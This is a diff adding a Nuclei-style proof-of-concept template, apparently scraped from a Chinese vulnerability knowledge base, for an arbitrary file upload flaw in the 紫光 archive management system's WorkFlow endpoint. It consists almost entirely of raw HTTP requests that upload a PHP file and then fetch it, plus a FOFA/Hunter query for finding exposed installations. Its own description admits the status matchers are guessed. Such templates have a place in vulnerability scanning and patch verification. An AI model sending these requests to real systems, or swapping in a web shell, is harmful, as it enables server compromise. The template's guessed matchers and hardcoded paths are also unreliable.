@@ -1,0 +1,95 @@
+id: poc-504abf1cc4958fdcd328
+info:
+  name: 紫光档案管理系统WorkFlow存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/504abf1cc4958fdcd328cb997a882403
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 504abf1cc4958fdcd328cb997a882403
+    fofa: + hunter`app.name="紫光档案管理系统"`
+http:
+- raw:
+  - 'POST /System/WorkFlow/upload.html?token=5117e82385cef4c12547fdd4c028b97a1-1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+
+    Connection: close
+
+    Content-Length: 566
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: multipart/form-data; boundary=vow8ojiofbpypwih3t3i
+
+
+    --vow8ojiofbpypwih3t3i
+
+    Content-Disposition: form-data; name="userID"
+
+
+    admin
+
+    --vow8ojiofbpypwih3t3i
+
+    Content-Disposition: form-data; name="fondsid"
+
+
+    1
+
+    --vow8ojiofbpypwih3t3i
+
+    Content-Disposition: form-data; name="comid"
+
+
+    1
+
+    --vow8ojiofbpypwih3t3i
+
+    Content-Disposition: form-data; name="token"
+
+
+    affe447f075bac53a7e568e833391e67
+
+    --vow8ojiofbpypwih3t3i
+
+    Content-Disposition: form-data; name="Filedata"; filename="wizjbifuta.php"
+
+    Content-Type: multipart/form-data
+
+
+
+    <?php echo "2ccASC47CJ474cqTBuzA0q6FCAS";unlink(__FILE__); ?>
+
+    --vow8ojiofbpypwih3t3i--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /tmp/System/WorkFlow/import/20240220/65d41fbc77b27.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+
+    Connection: close
+
+    Accept: text/*
+
+    Cookie: PHPSESSID=d3dbba517d0d6ff544f1be11e134a7f9
+
+    Accept-Encoding: gzip, deflate'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
